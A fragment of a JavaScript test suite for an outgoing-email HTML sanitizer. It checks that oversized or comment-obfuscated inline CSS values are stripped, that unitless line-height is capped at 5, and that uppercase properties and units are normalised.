  test.each([
    ["font-size/**/:999pt"],
    ["/**/font-size:999pt"],
    ["font-size /**/ :999pt"],
    ["margin-left/**/:999in"],
    ["margin-top/*x*/:50%"],
    ["text-indent/**/:-999pt"],
    ["line-height/**/:999pt"],
    ["font-size/**/:999pt !important"],
    ["font-size/*unterminated:999pt"],
    ["font-si/**/ze:999pt"],
  ])("%s is dropped", (style) => {
    expect(sanitizeOutgoingEmailHtml(`<p style="${style}">x</p>`)).toBe("<p>x</p>");
  });

  test("a comment around a legitimate value is harmless", () => {
    expect(sanitizeOutgoingEmailHtml('<p style="font-size/**/:12pt">x</p>')).toBe(
      '<p style="font-size:12pt">x</p>',
    );
  });

  test("unitless line-height is capped at 5", () => {
    expect(sanitizeOutgoingEmailHtml('<p style="line-height:5">x</p>')).toBe(
      '<p style="line-height:5">x</p>',
    );
    expect(sanitizeOutgoingEmailHtml('<p style="line-height:5.1">x</p>')).toBe("<p>x</p>");
  });

  test("uppercase units are normalised", () => {
    expect(sanitizeOutgoingEmailHtml('<p style="MARGIN-TOP:12PT;Font-Size:11PT">x</p>')).toBe(
      '<p style="margin-top:12pt;font-size:11pt">x</p>',
    );
  });
});
